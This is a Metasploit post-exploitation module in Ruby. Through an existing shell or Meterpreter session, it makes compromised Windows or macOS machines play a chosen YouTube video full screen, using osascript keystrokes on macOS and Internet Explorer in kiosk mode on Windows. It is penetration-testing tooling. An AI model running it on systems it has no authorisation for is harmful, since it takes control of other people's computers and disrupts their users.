##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Youtube Broadcast',
      'Description'   => %q{
        This module will broadcast a Youtube video on all compromised systems. It will play
        the video in the target machine's native browser in full screen mode. The VID datastore
        option is the "v" parameter in your Youtube video's URL.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'sinn3r'],
      'Platform'      => [ 'win', 'osx' ],
      'SessionTypes'  => [ 'shell', 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('VID', [true, 'The video ID to the Youtube video'])
      ], self.class)
  end

  def peer
    "#{session.session_host}:#{session.session_port}"
  end


  #
  # The OSX version uses an action script to do this
  #
  def osx_start_video(id)
    url = "https://youtube.googleapis.com/v/#{id}?fs=1&autoplay=1"
    script = ''
    script << %Q|osascript -e 'tell application "Safari" to open location "#{url}"' |
    script << %Q|-e 'activate application "Safari"' |
    script << %Q|-e 'tell application "System Events" to key code {59, 55, 3}'|

    cmd_exec(script)
  end

  #
  # The Windows version uses the "embed" player to make sure IE won't download the SWF as an object
  #
  def win_start_video(id)
    iexplore_path = "C:\\Program Files\\Internet Explorer\\iexplore.exe"
    begin
      session.sys.process.execute(iexplore_path, "-k http://youtube.com/embed/#{id}?autoplay=1")
    rescue Rex::Post::Meterpreter::RequestError => e
      return false
    end

    true
  end

  def start_video(id)
    case session.platform
    when /osx/
      osx_start_video(id)
    when /win/
      win_start_video(id)
    end
  end

  def run
    id = datastore['VID']

    print_status("#{peer} - Spawning video...")
    if start_video(id)
      print_good("#{peer} - The video has started")
    else
      print_error("#{peer} - Unable to start the video")
      return
    end

  end

end
